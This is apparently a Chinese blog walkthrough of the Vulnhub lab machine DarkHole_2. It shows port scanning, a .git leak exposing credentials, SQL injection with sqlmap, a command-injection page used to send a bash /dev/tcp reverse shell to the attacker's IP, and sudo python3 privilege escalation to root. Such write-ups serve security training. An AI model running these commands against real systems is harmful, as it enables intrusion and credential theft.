---
layout: post
title: "DarkHole_2 walkthrough"
date: 2021-10-09
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP                |
| ------------- | ----------------- |
| 本机（Win10） | `192.168.174.1`   |
| Kali          | `192.168.174.128` |
| DarkHole_2    | `192.168.174.139` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.139`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.174.139
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 09:48 EDT
Nmap scan report for 192.168.174.139
Host is up (0.00082s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-git:
|   192.168.174.139:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: DarkHole V2
```

扫描发现目录存在 *.git* 源码泄露，我们使用 *githack* 脚本将源码下载下来，并且回溯到之前的版本，查看源码发现 *login.php* 文件存在账户名和密码：

```php
<?php
session_start();
require 'config/config.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
        $_SESSION['userid'] = 1;
        header("location:dashboard.php");
        die();
    }
}
?>
```

使用 `lush@admin.com:321`账户名和密码进行登录后跳转到 *dashboard.php* 页面，通过对 *dashboard.php* 文件进行简单代码审计发现存在sql注入漏洞：

```php
<?php
goto HjT6m;
eI0kG:
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fname = mysqli_real_escape_string($connect, $_POST["fname"]);
    $email = mysqli_real_escape_string($connect, $_POST["email"]);
    $address = mysqli_real_escape_string($connect, $_POST["address"]);
    $mobile = $_POST["mobile"];
    $connect->query("update users set username='{$fname}',email='{$email}',address='{$address}',contact_number='{$mobile}' where id=1");
    header("location:dashboard.php");
    die;
}
.......
?>
```

### SQL注入

将请求包复制到 *post.txt* 文件里，并使用 *sqlmap* 工具进行注入，最后我们得到 ssh 表格里的登录账户信息：

```shell
[10:38:15] [INFO] retrieved: fool
Database: darkhole_2
Table: ssh
[1 entry]
+--------+------+
| user   | pass |
+--------+------+
| jehad  | fool |
+--------+------+
```

### Getshell

使用 `jehad:fool` 账户名和密码进行ssh登录后进行信息收集，注意到靶机存在3个日常账户：`jehad`、`lama`、`losy`。此外在查看进程时，发现 *losy* 用户开启本地 **9999** 端口：

```shell
root         872  0.0  0.0   6812  3060 ?        Ss   13:45   0:00 /usr/sbin/cron -f
root        1247  0.0  0.0   8480  3316 ?        S    13:46   0:00  \_ /usr/sbin/CRON -f
losy        1255  0.0  0.0   2608   536 ?        Ss   13:46   0:00      \_ /bin/sh -c  cd /opt/web && php -S localhost:999
losy        1257  0.0  0.4 193672 19104 ?        S    13:46   0:00          \_ php -S localhost:9999
```

定位到 */opt/web* 目录下，其中 *index.php* 文件内容中存在命令注入漏洞：

```php
<?php
	echo "Parameter GET['cmd']";
	if(isset($_GET['cmd'])){
		echo system($_GET['cmd']);
	}
?>
```

将反向shell 语句： `/bin/bash -c 'bash -i >& /dev/tcp/192.168.174.128/5566 0>&1'`经过URL编码后传递给 *cmd* 参数即可。

```shell
jehad@darkhole:~$ curl http://127.0.0.1:9999/?cmd=%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%37%34%2e%31%32%38%2f%35%35%36%36%20%30%3e%26%31%27
```

### 提权

Kali 监听 **5566** 端口后就会进行shell连接，访问用户主目录，查看 *user.txt* 文件得到第一个 flag：

```shell
losy@darkhole:~$ cat user.txt
cat user.txt
DarkHole{'This_is_the_life_man_better_than_a_cruise'}
```

在查看历史命令时，找到 *losy* 账户的密码是：`gang`。之后查看 *sudo* 权限时可运行 *python3* 命令。

```shell
losy@darkhole:~$ sudo -l
[sudo] password for losy:
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User losy may run the following commands on darkhole:
    (root) /usr/bin/python3
```

接下来就是通过 *python3* 进行提权，执行命令：`sudo python3 -c 'import pty;pty.spawn("/bin/bash")'`即可，最后读取 *root.txt* 文件就得到了最后一个flag：

```shell
losy@darkhole:~$ sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
root@darkhole:/home/losy# id
id
uid=0(root) gid=0(root) groups=0(root)
root@darkhole:/home/losy# cd /root
cd /root
root@darkhole:~# ls
ls
root.txt  snap
root@darkhole:~# cat root.txt
cat root.txt
DarkHole{'Legend'}
```

### 总结

1. `ps auxf` 命令查看详细进程信息

2. python 提权可执行命令：

   ```shell
   sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
   sudo python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
   ```

   
